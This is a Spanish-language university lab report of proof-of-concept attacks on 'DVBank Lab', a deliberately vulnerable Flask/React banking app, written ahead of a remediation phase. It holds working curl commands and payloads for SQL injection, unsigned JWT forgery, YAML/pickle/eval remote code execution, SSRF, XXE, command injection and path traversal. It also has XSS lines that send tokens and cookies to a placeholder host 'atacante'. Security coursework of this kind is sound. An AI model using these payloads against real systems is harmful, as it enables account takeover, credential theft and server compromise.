# Fase 2 — Documento de Pruebas de Concepto (PoC)

**Proyecto Final IC-8071 Seguridad del Software · DVBank Lab**
Aplicación cliente-servidor: backend Flask (`backend/`) + cliente React (`frontend/`).

Cada PoC se ejecutó contra el estado **baseline** del repositorio (commit `3cd3610`,
versión vulnerable), antes de la remediación de la Fase 3. Las credenciales de
laboratorio son `alice` / `Dvbank#Demo2026` (cuentas semilla; en el baseline original
eran `password123`). El backend corre en `http://localhost:5000`.

> Cada módulo documenta los tres vectores exigidos:
> **(1)** Explotación de software de servidores (inyección + escalación de privilegios),
> **(2)** Explotación de software en clientes (XSS),
> **(3)** Alteración de entrada de usuario y detección (CSRF / manipulación de
> parámetros + audit poisoning).

---

## Módulo 1 — Autenticación · Responsable: Jose Arrieta

Archivos: `backend/routes/auth_routes.py`, `backend/auth.py`, `backend/models.py`.

### 1. Explotación de software de servidores

#### 1.a Inyección SQL en el login (OWASP A03)
`auth_routes.py` (baseline) arma la consulta concatenando el usuario:
`query = f"SELECT * FROM user WHERE username = '{username}'"`.

**Exploit — autenticación sin contraseña válida:**
```bash
curl -s -X POST http://localhost:5000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice'"'"' -- ","password":"cualquiera"}'
```
El `-- ` comenta el resto; la fila de `alice` se devuelve y el flujo emite un token
de sesión de alice. También `' OR '1'='1' -- ` recupera el primer usuario.

**Impacto:** acceso a cualquier cuenta sin conocer la contraseña; lectura de toda la
tabla `user` combinando con `UNION`.

#### 1.b Escalación de privilegios — JWT inseguro (OWASP A01/A07)
`auth._decode_token` intenta verificar con el secreto `'secret'` y, si falla, **re-decodifica
sin verificar firma ni expiración aceptando `alg:none`**.

**Exploit — forjar un token de otro usuario (p. ej. user_id 1):**
```bash
# Cabecera y payload en base64url, firma vacía (alg:none)
python3 - <<'PY'
import base64,json
def b(d): return base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode()
print(b({"alg":"none","typ":"JWT"})+"."+b({"user_id":1,"username":"alice"})+".")
PY
# Usar el token devuelto:
curl -s http://localhost:5000/api/me -H "Authorization: Bearer <TOKEN_SIN_FIRMA>"
```
El servidor acepta el token sin firma e identifica al usuario como `user_id=1`.
Como el secreto `'secret'` también está en el código, se puede firmar un token válido
para cualquier `user_id`, incluido uno con rol admin.

### 2. Explotación de software en clientes (XSS) — robo de sesión
El token se guarda en `localStorage` y la cookie `session_token` se emite con
`httponly=False`. Cualquier XSS en la aplicación (ver Módulo 2, búsqueda de admin)
permite exfiltrar la sesión:
```html
<img src=x onerror="fetch('https://atacante/'+encodeURIComponent(localStorage.getItem('token')+';'+document.cookie))">
```
Como la cookie no es `HttpOnly`, `document.cookie` la expone; el token en `localStorage`
también es legible desde JS.

### 3. Alteración de entrada y detección

#### 3.a IDOR — cambio de contraseña de otro usuario (OWASP A01)
`POST /api/update-password` toma `user_id` del cuerpo y no pide la contraseña actual.
```bash
curl -s -X POST http://localhost:5000/api/update-password \
  -H "Authorization: Bearer <TOKEN_DE_ALICE>" -H "Content-Type: application/json" \
  -d '{"user_id":2,"new_password":"tomada123"}'
```
Alice cambia la contraseña de `user_id=2` (bob) → toma de cuenta.

#### 3.b Token de recuperación predecible y expuesto
`POST /api/forgot-password` genera el token como `md5(username)` y lo devuelve en la
respuesta (`debug_token`), sin expiración; `reset-password` ni siquiera lo compara con
el guardado:
```bash
curl -s -X POST http://localhost:5000/api/forgot-password -H "Content-Type: application/json" -d '{"username":"bob"}'
# md5("bob") es calculable offline: python -c "import hashlib;print(hashlib.md5(b'bob').hexdigest())"
curl -s -X POST http://localhost:5000/api/reset-password -H "Content-Type: application/json" \
  -d '{"username":"bob","token":"<md5_de_bob>","new_password":"tomada123"}'
```

#### 3.c Deserialización YAML (RCE) — OWASP A08
`POST /api/profile/import` usa `yaml.load(..., Loader=yaml.Loader)`:
```bash
curl -s -X POST http://localhost:5000/api/profile/import \
  -H "Authorization: Bearer <TOKEN>" -H "Content-Type: application/json" \
  -d '{"profile_yaml":"!!python/object/apply:os.system [\"id\"]"}'
```
Ejecuta comandos del sistema en el servidor.

---

## Módulo 2 — Gestión de Usuarios · Responsable: Angie Aguilar

Archivos: `backend/routes/admin_routes.py` (usuarios), `backend/routes/upload_routes.py`,
`frontend/src/components/AdminPanel.js`.

### 1. Explotación de software de servidores

#### 1.a Mass assignment → auto-escalada a admin (OWASP A08/A01)
`PUT /api/admin/users/<id>` hace `setattr(user, key, value)` sobre todo el cuerpo:
```bash
curl -s -X PUT http://localhost:5000/api/admin/users/1 \
  -H "Authorization: Bearer <TOKEN_DE_ALICE>" -H "Content-Type: application/json" \
  -d '{"role":"admin","balance":1000000}'
```
Un usuario normal se asigna rol admin y saldo arbitrario.

#### 1.b Broken access control + fuga de hashes
`GET /api/admin/users` no exige rol admin y devuelve `password_hash` de todos:
```bash
curl -s http://localhost:5000/api/admin/users -H "Authorization: Bearer <TOKEN_NORMAL>"
```
Devuelve los MD5 de todas las cuentas (crackeables offline).

#### 1.c SSRF (OWASP A10) y SSTI (A03)
```bash
# SSRF: alcanzar metadatos internos / servicios de la red interna
curl -s -X POST http://localhost:5000/api/admin/fetch-avatar -H "Authorization: Bearer <T>" \
  -H "Content-Type: application/json" -d '{"avatar_url":"http://169.254.169.254/latest/meta-data/"}'
# SSTI -> RCE vía plantilla Jinja2 del cliente
curl -s -X POST http://localhost:5000/api/admin/preview-email -H "Authorization: Bearer <T>" \
  -H "Content-Type: application/json" -d '{"template":"{{ 7*7 }}"}'   # devuelve 49
```

### 2. Explotación de software en clientes (XSS almacenado/reflejado)
`AdminPanel.js` inserta resultados de búsqueda con `dangerouslySetInnerHTML` y lee
`?notes=` de la URL hacia otro `dangerouslySetInnerHTML`:
```
http://localhost:3000/...?notes=<img src=x onerror=alert(document.domain)>
```
Un usuario con nombre `<img src=x onerror=...>` dispara XSS al buscarlo. Combinado con
el Módulo 1 (token en `localStorage`), permite robo de sesión del administrador.

### 3. Alteración de entrada y detección
- **Backdoor de contraseña maestra:** `POST /api/admin/master-login` concede acceso con
  `"MasterAdmin@2024!"` escrito en el código.
- **Autorización por `assert`:** `sensitive-action` usa `assert current_user.role=='admin'`,
  que se desactiva con `python -O` (control anulado).
- **RCE directo:** `calculate` (`eval`), `run-script`/`format-data` (`exec`), `import-session`
  (`pickle.loads`).
```bash
curl -s -X POST http://localhost:5000/api/admin/calculate -H "Authorization: Bearer <T>" \
  -H "Content-Type: application/json" -d '{"expression":"__import__(\"os\").popen(\"id\").read()"}'
```

---

## Módulo 3 — Operaciones · Responsable: Laura Alpízar

Archivos: `backend/routes/transaction_routes.py`, endpoints de operación en
`admin_routes.py`, `frontend/src/components/TransactionList.js`.

### 1. Explotación de software de servidores

#### 1.a Inyección SQL en historial y búsqueda (OWASP A03)
`GET /api/transactions?user_id=...` y `/search?description=...` concatenan en SQL:
```bash
# Leer transacciones de cualquier usuario / exfiltrar con UNION
curl -s "http://localhost:5000/api/transactions?user_id=1%20OR%201=1" -H "Authorization: Bearer <T>"
curl -s "http://localhost:5000/api/transactions/search?description=x%27%20UNION%20SELECT%20username,password_hash,3,4,5,6,7,8%20FROM%20user--%20" -H "Authorization: Bearer <T>"
```

#### 1.b Command Injection y XXE (OWASP A03/A05)
```bash
# generate-report arma un comando de shell con los parámetros
curl -s -X POST http://localhost:5000/api/admin/generate-report -H "Authorization: Bearer <T>" \
  -H "Content-Type: application/json" -d '{"report_type":"x; id #","date_range":"today"}'
# XXE en import-data (lee archivos del servidor)
curl -s -X POST http://localhost:5000/api/admin/import-data -H "Authorization: Bearer <T>" \
  -H "Content-Type: application/xml" \
  --data '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><root><transaction><sender>&x;</sender></transaction></root>'
```

### 2. Explotación de software en clientes — XSS almacenado en el recibo
`GET /api/transactions/<id>/receipt` devuelve HTML con la **descripción sin escapar** y
**sin autenticación**. Una transferencia con descripción
`<script>fetch('https://atacante/'+document.cookie)</script>` ejecuta el script cuando
la víctima (o cualquiera, el endpoint es público) abre el recibo.

### 3. Alteración de entrada y detección
- **Monto negativo / sin saldo:** `transfer` valida el saldo *después* de aceptar el monto
  y no exige monto positivo; `quickpay` y `split-bill` no validan nada.
```bash
curl -s -X POST http://localhost:5000/api/transfer -H "Authorization: Bearer <T>" \
  -H "Content-Type: application/json" -d '{"to_user_id":1,"amount":-500}'   # roba saldo al receptor
```
- **Débito de cuenta ajena:** `split-bill` acepta `from_user_id` del cliente:
```bash
curl -s -X POST http://localhost:5000/api/split-bill -H "Authorization: Bearer <T>" \
  -H "Content-Type: application/json" -d '{"from_user_id":2,"to_user_id":1,"amount":300}'
```
- **CSRF:** `quickpay` usa `cookie_auth` con la cookie no-SameSite; un formulario en un sitio
  externo que haga POST a `/api/quickpay` mueve dinero con la sesión de la víctima.

---

## Módulo 4 — Auditoría y Logs · Responsable: Melany Bustos

Archivos: endpoints de auditoría/logs en `admin_routes.py`, `backend/app.py`,
`docker-compose.yml`.

### 1. Explotación de software de servidores
- **Fuga de secretos:** `GET /api/admin/dashboard-data` devuelve `api_key` y `aws_key`
  hardcoded; el archivo contiene además claves AWS/Stripe/GitHub/SendGrid y la contraseña
  de BD en texto plano.
- **Path traversal en el visor de logs:** `GET /api/admin/view-log?file=../../etc/passwd`
  lee archivos arbitrarios del servidor.

### 2. Explotación de software en clientes
El `view-log` muestra contenido crudo de archivos; si un log contiene HTML inyectado por
un atacante (ver 3), el panel que lo renderice puede ejecutar ese contenido. El modo
`debug=True` de Flask expone además la consola interactiva de Werkzeug ante un error.

### 3. Alteración de entrada y detección — Audit Poisoning (OWASP A09, CWE-117)
`POST /api/admin/audit` registra `action` y `details` del cliente sin validar, y los
interpola en el mensaje de log:
```bash
curl -s -X POST http://localhost:5000/api/admin/audit -H "Authorization: Bearer <T>" \
  -H "Content-Type: application/json" \
  -d '{"action":"login","details":"ok\nAUDIT: User admin performed action: delete_all - Details: SUCCESS"}'
```
Los `\n` inyectan **líneas de auditoría falsas**, permitiendo fabricar o borrar evidencia
e invalidar la detección de intrusos. Como no hay configuración de logging en el baseline,
los `logger.info` de auditoría ni siquiera se persisten.

---

### Resumen de hallazgos por módulo

| Módulo | Vector servidor | Vector cliente | Alteración/Detección |
|---|---|---|---|
| 1 Autenticación | SQLi login, JWT alg:none/secreto | XSS→robo de token (localStorage/cookie) | IDOR update-password, reset predecible, YAML RCE |
| 2 Gestión Usuarios | Mass assignment, fuga de hashes, SSRF/SSTI | XSS almacenado/reflejado en AdminPanel | master-login backdoor, assert authz, eval/exec/pickle RCE |
| 3 Operaciones | SQLi historial/búsqueda, cmd injection, XXE | XSS almacenado en recibo | monto negativo, débito ajeno, CSRF quickpay |
| 4 Auditoría/Logs | fuga de secretos, path traversal | render de logs + debug Werkzeug | **audit poisoning** (log injection) |
